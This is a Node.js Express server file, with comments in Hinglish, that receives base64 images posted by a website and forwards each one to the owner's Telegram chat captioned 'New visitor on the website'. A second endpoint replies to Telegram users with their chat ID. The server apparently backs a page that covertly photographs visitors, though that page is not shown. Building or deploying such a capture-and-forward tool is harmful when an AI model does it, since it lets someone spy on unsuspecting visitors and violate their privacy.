const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();

// Environment Variables se Token aur Chat ID lenge
// Vercel me isko set karna hoga
const token = process.env.BOT_TOKEN;
const ownerChatId = process.env.YOUR_CHAT_ID;

// Agar token ya chat id nahi hai to error show karega
if (!token || !ownerChatId) {
    console.error("Kripya TELEGRAM_BOT_TOKEN aur YOUR_CHAT_ID environment variables set karein.");
    // process.exit(1); // Local me exit karega, Vercel par log me dikhega
}

const bot = new TelegramBot(token);

// Middleware
app.use(cors());
// body-parser ko image data (jo bada ho sakta hai) handle karne ke liye limit set karein
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true }));


// API Endpoint 1: Jab website se photo aayegi
app.post('/api/send-photo', (req, res) => {
    const { image } = req.body;

    if (!image) {
        return res.status(400).json({ status: 'error', message: 'No image data received' });
    }

    try {
        // Base64 dataURL se image data extract karna
        const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
        const imageBuffer = Buffer.from(base64Data, 'base64');
        
        // Telegram ko photo bhejna
        bot.sendPhoto(ownerChatId, imageBuffer, { caption: `New visitor on the website at ${new Date().toLocaleString()}` })
            .then(() => {
                res.json({ status: 'success', message: 'Photo sent to bot' });
            })
            .catch(err => {
                console.error("Telegram Error:", err.message);
                res.status(500).json({ status: 'error', message: 'Failed to send photo' });
            });

    } catch (error) {
        console.error("Error processing image: ", error);
        res.status(500).json({ status: 'error', message: 'Internal server error' });
    }
});


// API Endpoint 2: Jab koi user bot ko message karega (Webhook ke liye)
app.post(`/api/webhook`, (req, res) => {
    const message = req.body.message;

    if (message) {
        const chatId = message.chat.id;
        const userName = message.from.first_name;
        
        // Agar message bhej ne wala owner nahi hai, to use uska name aur chat id bhej do
        const replyText = `Hello ${userName}!\nYour Chat ID is: ${chatId}`;
        
        bot.sendMessage(chatId, replyText);
    }
    
    // Telegram ko 200 OK bhejna zaroori hai
    res.sendStatus(200);
});


// Frontend (index.html) ko serve karne ke liye
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Vercel ke liye server ko export karna
module.exports = app;
